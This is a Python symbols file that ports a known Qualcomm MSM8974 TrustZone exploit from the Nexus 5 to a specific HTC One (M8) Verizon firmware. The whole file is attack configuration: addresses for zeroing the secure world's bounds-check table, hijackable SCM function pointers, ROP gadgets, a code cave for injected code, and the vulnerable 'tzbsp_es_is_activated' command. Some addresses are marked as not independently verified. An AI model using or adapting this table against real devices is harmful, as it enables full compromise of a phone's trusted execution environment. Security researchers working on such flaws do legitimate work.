# TrustZone address map for HTC One (M8) Verizon
# HTC TrustZone image: TZ.BF.2.0-2.0.0114 / hTCVer2.00.114.07
# sha256 69fbfaf6558958110e7d1301dfcbec8e2151f3b00df57c2ac4f80da2cf502216
#
# Derived by cross-matching against the Nexus 5 (hammerhead KTU84P) image
# TZ.BF.2.0-2.0.0087, for which the exploit's original addresses are known.
# Both images share identical segment virtual addresses; code and data
# structures matched byte-for-byte in the overlapping regions.
#
# Original Nexus 5 table (laginimaineb/MSM8974_exploit symbols.py) in comments.

# --- bounds-check control -------------------------------------------------
# N5 0xFE828444. Entry 0 of the {index,count,start,end} region descriptor
# table; the count field is zeroed to disable the checks.
BOUNDS_CHECK_DWORD_ADDRESS = 0xFE8256A4

# N5 0xFE8304EC..0xFE8306E8. 128 dwords in BSS; address derived from the
# table-relative offset, NOT yet independently verified.
BOUNDS_CHECKS_RANGE_START = 0xFE82D74C
BOUNDS_CHECKS_RANGE_END   = 0xFE82D948

# --- fver scratch ---------------------------------------------------------
# N5 0xFE828994. HTC fver table {code,value} found at 0xFE825DE4, and its
# values are byte-identical to the Nexus 5 table (incl. 0x800000 at code 5).
VERSION_CODE_0_DWORD_ADDRESS = 0xFE825DE8

# --- hijackable SCM function pointers ------------------------------------
# N5 0xFE82D504 / 0xFE82D584. Slot spacing of 0x80 is preserved in HTC.
TZBSP_GET_DIAG_POINTER_ADDRESS = 0xFE82B8B8          # -> 0xFE813A83
TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS = 0xFE82B938   # -> 0xFE8121CF

# --- gadgets --------------------------------------------------------------
# N5 values in comments. All verified by disassembly in the HTC image.
BX_LR = 0xFE80663C + 1                     # N5 0xFE806604+1   (thumb)
LDR_R0_R0_R1_BX_LR = 0xFE80A666 + 1        # N5 0xFE80A994+1   (thumb)
LDR_R1_R1_STR_R1_R0_BX_LR = 0xFE813B1C + 1 # N5 0xFE8131B2+1   (thumb)
STR_R0_R1_BX_LR = 0xFE80972E + 1           # N5 0xFE852BB6+1 was outside
                                           #   the dumped region; this is an
                                           #   in-image equivalent (thumb).

# SET_DACR and INVALIDATE_INSTRUCTION_CACHE are ARM-mode (no thumb bit).
SET_DACR = 0xFE80FA20                      # N5 0xFE80FCC4  byte-identical
INVALIDATE_INSTRUCTION_CACHE = 0xFE80F590  # N5 0xFE80F834  byte-identical

# --- code cave ------------------------------------------------------------
# N5 0xFE81DE70 is exactly the end of its text segment; HTC text ends at
# 0xFE81DED0 and the following 0xFE81E000 RW segment is 100% identical to N5.
CODE_CAVE_ADDRESS = 0xFE81DED0
CODE_CAVE_SIZE = 0x1000 - (CODE_CAVE_ADDRESS & 0xFFF)

# --- confirmed-live vulnerable SCM command --------------------------------
# From HTC's own SCM descriptor table (verified present):
#   0xFE82B8E4  id=0x4002 svc=0x10 cmd=2  name='tzbsp_es_is_activated'
#               handler fn=0xFE850897
SCM_SVC_ES = 0x10
SCM_IS_ACTIVATED_ID = 0x2
TZBSP_ES_IS_ACTIVATED_FN = 0xFE850897
